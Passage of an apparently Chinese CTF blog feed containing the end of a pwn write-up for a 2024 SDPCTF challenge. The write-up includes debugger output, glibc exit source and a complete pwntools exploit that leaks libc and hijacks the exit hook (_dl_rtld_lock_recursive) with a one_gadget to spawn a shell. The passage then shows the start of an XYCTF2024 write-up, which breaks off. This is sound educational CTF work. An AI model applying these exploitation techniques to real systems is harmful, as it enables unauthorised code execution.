class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">pwndbg</span>&gt; p &amp;_rtld_global</span><br><span class="line">$<span class="number">1</span> = (&lt;<span class="class"><span class="keyword">data</span> variable, no debug info&gt; *) 0x7ffff7ffd060 &lt;_rtld_global&gt;</span></span><br><span class="line"><span class="title">pwndbg</span>&gt; vmmap</span><br><span class="line"><span class="type">LEGEND</span>: <span class="type">STACK</span> | <span class="type">HEAP</span> | <span class="type">CODE</span> | <span class="type">DATA</span> | <span class="type">RWX</span> | <span class="type">RODATA</span></span><br><span class="line">             <span class="type">Start</span>                <span class="type">End</span> <span class="type">Perm</span>     <span class="type">Size</span> <span class="type">Offset</span> <span class="type">File</span></span><br><span class="line">          <span class="number">0x3fe000</span>           <span class="number">0x3ff000</span> rw-p     <span class="number">1000</span>      <span class="number">0</span> /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/pwn</span><br><span class="line">          <span class="number">0x400000</span>           <span class="number">0x401000</span> r<span class="comment">--p     1000   2000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/pwn</span></span><br><span class="line">          <span class="number">0x401000</span>           <span class="number">0x402000</span> r-xp     <span class="number">1000</span>   <span class="number">3000</span> /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/pwn</span><br><span class="line">          <span class="number">0x402000</span>           <span class="number">0x403000</span> r<span class="comment">--p     1000   4000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/pwn</span></span><br><span class="line">          <span class="number">0x403000</span>           <span class="number">0x404000</span> r<span class="comment">--p     1000   4000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/pwn</span></span><br><span class="line">          <span class="number">0x404000</span>           <span class="number">0x405000</span> rw-p     <span class="number">1000</span>   <span class="number">5000</span> /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/pwn</span><br><span class="line">    <span class="number">0x7ffff7dd5000</span>     <span class="number">0x7ffff7df7000</span> r<span class="comment">--p    22000      0 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/libc-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7df7000</span>     <span class="number">0x7ffff7f6f000</span> r-xp   <span class="number">178000</span>  <span class="number">22000</span> /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7f6f000</span>     <span class="number">0x7ffff7fbd000</span> r<span class="comment">--p    4e000 19a000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/libc-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7fbd000</span>     <span class="number">0x7ffff7fc1000</span> r<span class="comment">--p     4000 1e7000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/libc-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7fc1000</span>     <span class="number">0x7ffff7fc3000</span> rw-p     <span class="number">2000</span> 1eb000 /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fc3000</span>     <span class="number">0x7ffff7fc9000</span> rw-p     <span class="number">6000</span>      <span class="number">0</span> [anon_7ffff7fc3]</span><br><span class="line">    <span class="number">0x7ffff7fc9000</span>     <span class="number">0x7ffff7fcd000</span> r<span class="comment">--p     4000      0 [vvar]</span></span><br><span class="line">    <span class="number">0x7ffff7fcd000</span>     <span class="number">0x7ffff7fcf000</span> r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line">    <span class="number">0x7ffff7fcf000</span>     <span class="number">0x7ffff7fd0000</span> r<span class="comment">--p     1000      0 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/ld-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7fd0000</span>     <span class="number">0x7ffff7ff3000</span> r-xp    <span class="number">23000</span>   <span class="number">1000</span> /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/ld-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ff3000</span>     <span class="number">0x7ffff7ffb000</span> r<span class="comment">--p     8000  24000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/ld-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r<span class="comment">--p     1000  2c000 /mnt/d/software/CTF/PWN/pwnwork/2024sdpctf/magic_write/ld-2.31.so</span></span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span>  2d000 /mnt/d/software/<span class="type">CTF</span>/<span class="type">PWN</span>/pwnwork/2024sdpctf/magic_write/ld-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span>      <span class="number">0</span> [anon_7ffff7ffe]</span><br><span class="line">    <span class="number">0x7ffffffdd000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">22000</span>      <span class="number">0</span> [stack]</span><br><span class="line"><span class="title">pwndbg</span>&gt; tele <span class="number">0x7ffff7ffdf68</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7ffdf68</span> (_rtld_global+<span class="number">3848</span>) —▸ <span class="number">0x7ffff7fd0150</span> ◂— endbr64</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7ffdf70</span> (_rtld_global+<span class="number">3856</span>) —▸ <span class="number">0x7ffff7fd0160</span> ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff7ffdf78</span> (_rtld_global+<span class="number">3864</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffff7ffdf90</span> (_rtld_global+<span class="number">3888</span>) —▸ <span class="number">0x7ffff7fe4140</span> (_dl_make_stack_executable) ◂— endbr64</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffff7ffdf98</span> (_rtld_global+<span class="number">3896</span>) ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffff7ffdfa0</span> (_rtld_global+<span class="number">3904</span>) ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure><p>命令当中tele那句只是为了确认0xf08处是否是_dl_rtld_lock_recursive，一般看到0x150和0x160结尾的一般就是了。小版本差异可能导致偏移不一致。</p><p>可以看到<code>_rtld_global</code>的地址位于0x7ffff7ffd060，而libc基址位于0x7ffff7dd5000，又知<code>_dl_rtld_lock_recursive</code>在结构体中的偏移位置一般是0xf08，所以计算器算一下就可以得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_rtld_global = libc_base+<span class="number">0x228060</span></span><br><span class="line">_dl_rtld_lock_recursive = _rtld_global + <span class="number">0xf08</span></span><br><span class="line">_dl_rtld_unlock_recursive = _rtld_global + <span class="number">0xf10</span></span><br></pre></td></tr></table></figure><p>有了这些偏移，我们就可以劫持lock这个函数指针为onegadget，从而使程序执行exit的时候可以执行到onegadget，于是我使用下面的语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Congratulations on completing a big step\n&quot;</span>)</span><br><span class="line">r.send(p64(_dl_rtld_lock_recursive))</span><br><span class="line">r.send(p64(libc_base+one[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>运行后发现被检测出来栈溢出了！</p><p><img src="https://c-lby.top/images/exit_hook_first_try/%E8%A2%AB%E6%A3%80%E6%B5%8B%E5%88%B0%E6%A0%88%E6%BA%A2%E5%87%BA.png" alt="被检测到栈溢出"></p><p>动调发现，还真是巧，执行exit函数的时候栈帧刚好和main函数的栈帧重叠了，而刚好输入的_dl_rtld_lock_recursive地址覆盖了rbp-0x8的位置。</p><p><img src="https://c-lby.top/images/exit_hook_first_try/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E6%A0%88.png" alt="栈溢出的栈"></p><p>往下单步到call execve前</p><p><img src="https://c-lby.top/images/exit_hook_first_try/%E6%A0%88%E6%BA%A2%E5%87%BA%E9%97%AE%E9%A2%98%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8.png" alt="栈溢出问题的寄存器"></p><p>可以发现，rsi最后指向0，但是rdx不为0。刚才提到这个问题，这会导致syscall失效，从而继续往下执行__stack_chk_fail，而后面rsp莫名奇妙变成了libc地址，栈不正常，从而被判断成有溢出。</p><p>如果细心一点会发现这时候r12是0，这意味着如果把one[1]换成one[0]这道题就可以结束了，但是我当时没发现，所以又折腾出了另一个问题。</p><h5 id="劫持exit-hook，但是只能用一遍"><a href="#劫持exit-hook，但是只能用一遍" class="headerlink" title="劫持exit hook，但是只能用一遍"></a>劫持exit hook，但是只能用一遍</h5><p>当时以为是exit函数栈帧与main函数重叠的原因（然而并不是）导致的栈溢出检测，想着能不能通过返回到类似sub rsp,20h这样的指令来抬高栈。所以我打算先劫持hook为0x4012C5（magic函数里的sub语句），返回magic再打hook为onegadget，发现虽然成功返回到了magic函数，并且不提示栈溢出了，但是也没打通。动调单步一直向下发现程序并没有执行到_dl_rtld_lock_recursive所指向的onegadget。比赛结束后问了xf1les师傅，翻了翻源码，发现这是exit函数有意为之的。</p><p>exit.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ef_free:</span><br><span class="line">    <span class="keyword">case</span> ef_us:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_on:</span><br><span class="line">      onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      onfct (status, f-&gt;func.on.arg);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_at:</span><br><span class="line">      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      atfct ();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment"> we must mark this function as ef_free.  */</span></span><br><span class="line">      f-&gt;flavor = ef_free;</span><br><span class="line">      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>exit.h：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ef_free,<span class="comment">/* `ef_free&#x27; MUST be zero!  */</span></span><br><span class="line">  ef_us,</span><br><span class="line">  ef_on,</span><br><span class="line">  ef_at,</span><br><span class="line">  ef_cxa</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注释有讲到，为了避免<code>dlclose/exit</code>争用两次调用<code>cxafct</code>，所以在case ef_cxa后会将<code>exit_function</code>结构体里的<code>f-&gt;flavor</code>置为<code>ef_free</code>，即设置为0。可以看到只有在ef_cxa的情况下才会对<code>cxafct</code>做出处理，这个东西会转换成_dl_fini函数地址，这里不展开，简单来说就是在这个情况下才会执行到_dl_rtld_lock_recursive所指向的函数。</p><p>我们用下面这个payload简单动调验证一下打hook前后flavor的变化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">b&quot;Congratulations on completing a big step\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r, <span class="string">&#x27;b *exit \n b *0x4012f0&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">r.send(p64(lock))</span><br><span class="line">r.send(p64(<span class="number">0x4012bd</span>))</span><br></pre></td></tr></table></figure><p>我们先单步到exit+27，不知道为什么pwndbg读取不到符号表，只能手动解释一下了。</p><p><img src="https://c-lby.top/images/exit_hook_first_try/flavor%E5%8A%A8%E8%B0%831.png" alt="flavor动调1"></p><p>此时程序准备call的函数其实就是<code>run_exit_handlers</code>，此时的rsi是<code>exit_funcs</code>指针，指向的是initial结构体。和这个结构体有关的数据结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> <span class="title">initial</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *__<span class="title">exit_funcs</span> =</span> &amp;initial;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">  &#125; on;</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">void</span> *dso_handle;</span><br><span class="line">  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>所以我们只要去看看0x7f46ee551ca0就能看到flavor了。如果有符号表，可以直接通过<code>p *(struct exit_function_list *) 0x7f46ee551ca0</code>查看，这里我们用telescope。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">pwndbg</span>&gt; telescope <span class="number">0x7f46ee551ca0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f46ee551ca0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f46ee551ca8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f46ee551cb0</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f46ee551cb8</span> ◂— <span class="number">0x895cab18d865f3a9</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f46ee551cc0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br></pre></td></tr></table></figure><p>可以看到0x10偏移处是4，也就是此时flavor是4，对应ef_cxa。</p><p>然后让程序运行到返回magic，再次查看</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">pwndbg</span>&gt; telescope <span class="number">0x7f46ee551ca0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ r15 <span class="number">0x7f46ee551ca0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7f46ee551cb8</span> ◂— <span class="number">0x895cab18d865f3a9</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7f46ee551cc0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓        <span class="number">3</span> skipped</span><br></pre></td></tr></table></figure><p>此时flavor的位置是0，对应ef_free，那么接下来无论怎么改_dl_rtld_lock_recursive或者unlock，他都不会进入到对应的函数里去执行，而是执行exit_group直接退出。</p><p>虽然对这道题没什么卵用，但至少这个实验可以得出exit hook没法用两次的结论（</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;47.98.236.4&#x27;, 5002)</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libcc = cdll.LoadLibrary(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x0401453</span></span><br><span class="line">ret = <span class="number">0x040101a</span></span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libcc.srand(libcc.time(<span class="number">0</span>))</span><br><span class="line">ran_num = libcc.rand() % <span class="number">110</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;please enter this challenge\n&quot;</span>, <span class="built_in">str</span>(ran_num).encode())</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Give you a gift\n&quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">_rtld_global = libc_base+<span class="number">0x222060</span></span><br><span class="line">_dl_rtld_lock_recursive = _rtld_global + <span class="number">0xf08</span></span><br><span class="line">_dl_rtld_unlock_recursive = _rtld_global + <span class="number">0xf10</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="built_in">hex</span>(_dl_rtld_lock_recursive))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Come and try it out\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + <span class="string">b&#x27;\xbd\x12\x40\x00\x00\x00&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *exit \n b *0x4012f0&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Congratulations on completing a big step\n&quot;</span>)</span><br><span class="line">r.send(p64(_dl_rtld_lock_recursive))</span><br><span class="line">r.send(p64(libc_base+one[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/12856?time__1311=mqmhq+xfxUxoDsD7GY5r=bDk7D8lKeD&alichlgref=https://www.bing.com/#toc-2">exit_hook攻击利用</a></p><p><a href="https://ixout.github.io/posts/11890/index.html">exit函数利用</a></p><p><a href="https://www.anquanke.com/post/id/260754#h2-0">Glibc2.32源码分析之exit部分</a></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
            <tag> exit_hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『XYCTF2024』 PWN WP</title>
      <link href="/2024/2024xyctf-pwn-wp/"/>
      <url>/2024/2024xyctf-pwn-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这新生赛难度新生打不了一点，这是让我这种菜鸡获得新生的比赛（但是AK了</p><h3 id="0x01-hello-world（签到）"><a href="#0x01-hello-world（签到）" class="headerlink" title="0x01 hello_world（签到）"></a>0x01 hello_world（签到）</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">20</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;please input your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x48</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to XYCTF! %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;please input your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x48</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to XYCTF! %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞很明显，两次栈溢出，都能溢出0x28字节。题目开了PIE，但这不重要，现在的当务之急是泄露出libc地址，因为程序并没有后门。题目给了libc附件，经过查表得知是libc6_2.35-0ubuntu3.6_amd64。</p><p>在做这道题的时候第一反应是，先泄露程序基址，然后在buf上构造fmt payload，调用printf泄露libc地址，然后返回到start后，再溢出进行getshell。当我调试好泄露程序基址的payload之后我转念一想，为什么不直接泄露libc地址既然如此？这样的话程序的两次溢出就已经够用了。</p><h5 id="思路-调试"><a href="#思路-调试" class="headerlink" title="思路&amp;调试"></a>思路&amp;调试</h5><p>众所周知，一般libc地址或者程序虚拟地址啥的都不会满一个字长然后占据满一个内存单元，否则地址容易随着前面内容的打印而一起被泄露出去，所以高位必须空出来至少一个字节用\x00阻断。字符串后加\x00同理。但是如果溢出可以把某个地址之前的\x00覆盖成可打印字符，那么后面的地址就会被连带出来从而泄露libc。</p><p>在本地调试，断点在printf，输入name后查看栈情况：</p><p><img src="https://c-lby.top/images/2024xyctf_pwn_wp/hello_world%E6%B3%84%E9%9C%B2libc%E8%B0%83%E8%AF%95.png" 